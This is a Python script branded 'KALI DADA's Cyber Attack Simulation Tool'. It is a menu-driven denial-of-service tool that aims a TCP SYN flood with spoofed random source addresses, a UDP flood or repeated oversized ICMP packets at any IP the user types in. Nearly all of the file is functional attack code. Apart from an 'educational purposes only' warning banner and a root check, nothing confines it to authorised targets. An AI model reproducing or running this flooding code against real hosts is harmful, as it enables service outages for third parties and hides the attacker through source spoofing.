import os
import sys
import time
import socket
import random
from scapy.all import IP, TCP, ICMP, send

# ANSI Colors for Hacker Theme
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# Your name for display
NAME = "Sujal Lamichhane"

def print_warning():
    """Display a warning message before starting."""
    os.system("clear")
    warning_message = f"""
{RED}{BOLD}
##############################################################################
#  WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!                      #
#  THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR ILLEGAL ACTIVITIES.       #
#  USE THIS TOOL ONLY IN A CONTROLLED AND AUTHORIZED ENVIRONMENT.            #
##############################################################################
{RESET}
"""
    print(warning_message)
    time.sleep(3)

def print_kali_dada_banner():
    """Display the KALI DADA banner and website info."""
    os.system("clear")
    banner = f"""
{GREEN}{BOLD}
 /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
| $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
| $$ /$$/ | $$  \ $$| $$        | $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
| $$$$$/  | $$$$$$$$| $$        | $$        | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
| $$  $$  | $$__  $$| $$        | $$        | $$  | $$| $$__  $$| $$  | $$| $$__  $$
| $$\  $$ | $$  | $$| $$        | $$        | $$  | $$| $$  | $$| $$  | $$| $$  | $$
| $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
|__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
                                                                                    

               {CYAN}Welcome to KALI DADA's Cyber Attack Simulation Tool{RESET}
"""
    print(banner)
    print(f"{YELLOW}Created by: {NAME}{RESET}")
    print(f"{CYAN}Website: sujallamichhane.com.np{RESET}")
    print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}\n")
    time.sleep(1)

def check_root():
    """Ensure the script is run as root."""
    if os.geteuid() != 0:
        print(f"{RED}[!] This script must be run as root (sudo). Exiting...{RESET}")
        sys.exit(1)

def server_status(target_ip):
    """Check if the target server is up by attempting a connection on port 80."""
    try:
        socket.create_connection((target_ip, 80), timeout=2)
        print(f"{GREEN}[+] Server {target_ip} is UP!{RESET}")
        return True
    except Exception as e:
        print(f"{RED}[-] Server {target_ip} is DOWN! Error: {e}{RESET}")
        return False

def syn_flood(target_ip, target_port, duration):
    """Perform a TCP SYN Flood Attack with MTU 1500."""
    print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port} (MTU 1500){RESET}")
    timeout = time.time() + duration
    packet_count = 0
    
    # MTU 1500: MSS = 1500 - 20 (IP) - 20 (TCP base) = 1460
    mss_option = 1460  # Fixed MSS for MTU 1500
    
    try:
        while time.time() < timeout:
            # Generate a random source IP
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            # Random source port in ephemeral range (HTTP-like)
            src_port = random.randint(49152, 65535)
            # Random sequence number
            seq_num = random.randint(1, 4294967295)
            # Fixed window size (max for HTTP clients)
            window_size = 65535
            # Timestamp for realism
            timestamp_option = int(time.time())

            # Craft TCP options (HTTP-like, respecting MTU)
            tcp_options = [
                ('MSS', mss_option),           # 4 bytes
                ('Timestamp', (timestamp_option, 0)),  # 10 bytes
                ('NOP', None),                 # 1 byte
                ('SAckOK', ''),                # 2 bytes
            ]
            # Total TCP header: 20 (base) + 17 (options) = 37 bytes
            # Total packet: 20 (IP) + 37 (TCP) = 57 bytes < 1500

            # Craft the packet
            packet = (
                IP(src=src_ip, dst=target_ip) /
                TCP(
                    sport=src_port,
                    dport=target_port,
                    flags="S",  # SYN flag
                    seq=seq_num,
                    window=window_size,
                    options=tcp_options
                )
            )
            
            # Verify packet size respects MTU 1500
            packet_size = len(packet)
            if packet_size > 1500:
                print(f"{RED}[WARNING] Packet size {packet_size} exceeds MTU 1500!{RESET}")
                break

            # Send the packet
            send(packet, verbose=False)
            packet_count += 1
            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
            # Small delay to mimic HTTP client behavior
            time.sleep(random.uniform(0.005, 0.05))

    except KeyboardInterrupt:
        print(f"\n{RED}[INFO] Stopping TCP SYN Flood Attack...{RESET}")
        print(f"{GREEN}Happy Hacking!{RESET}")
    print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")

def udp_flood(target_ip, target_port, duration):
    """Perform a UDP Flood Attack."""
    print(f"{YELLOW}[+] Starting UDP Flood Attack on {target_ip}:{target_port}{RESET}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = random._urandom(1024)
    except Exception as e:
        print(f"{RED}[ERROR] Could not create UDP socket: {e}{RESET}")
        return
    timeout = time.time() + duration
    packet_count = 0
    try:
        while time.time() < timeout:
            sock.sendto(packet, (target_ip, target_port))
            packet_count += 1
            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
    except KeyboardInterrupt:
        print(f"\n{RED}[INFO] Stopping UDP Flood Attack...{RESET}")
        print(f"{GREEN}Happy Hacking!{RESET}")
    print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")

def ping_of_death(target_ip, duration):
    """Perform a Ping of Death Attack."""
    print(f"{YELLOW}[+] Starting Ping of Death Attack on {target_ip}{RESET}")
    timeout = time.time() + duration
    packet_count = 0
    try:
        while time.time() < timeout:
            packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
            send(packet, verbose=False)
            packet_count += 1
            print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
    except KeyboardInterrupt:
        print(f"\n{RED}[INFO] Stopping Ping of Death Attack...{RESET}")
        print(f"{GREEN}Happy Hacking!{RESET}")
    print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")

def select_attack():
    """Prompt user to select the type of attack."""
    while True:
        print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
        print("1: TCP SYN Flood")
        print("2: UDP Flood")
        print("3: Ping of Death")
        print("4: Exit")
        try:
            choice = int(input(f"{CYAN}Enter your choice (1-4): {RESET}"))
        except ValueError:
            print(f"{RED}[ERROR] Invalid input. Please enter a number between 1 and 4.{RESET}")
            continue
        
        if choice == 4:
            print(f"{GREEN}Exiting...{RESET}")
            sys.exit(0)
        
        target_ip = input(f"{CYAN}Enter Target IP: {RESET}").strip()
        if choice in [1, 2]:
            try:
                target_port = int(input(f"{CYAN}Enter Target Port: {RESET}").strip())
            except ValueError:
                print(f"{RED}[ERROR] Invalid port number.{RESET}")
                continue
        else:
            target_port = None
        try:
            duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}").strip())
        except ValueError:
            print(f"{RED}[ERROR] Invalid duration.{RESET}")
            continue
        
        if not server_status(target_ip):
            print(f"{RED}[ERROR] Target server seems down. Check the IP or try again later.{RESET}")
            continue
        
        if choice == 1:
            syn_flood(target_ip, target_port, duration)
        elif choice == 2:
            udp_flood(target_ip, target_port, duration)
        elif choice == 3:
            ping_of_death(target_ip, duration)
        
        # After completing the attack, ask the user if they want to continue
        continue_choice = input(f"{CYAN}Do you want to perform another attack? (y/n): {RESET}").strip().lower()
        if continue_choice != 'y':
            print(f"{GREEN}Exiting...{RESET}")
            break

def main():
    print_kali_dada_banner()
    check_root()
    select_attack()

if __name__ == "__main__":
    print_warning()
    main()
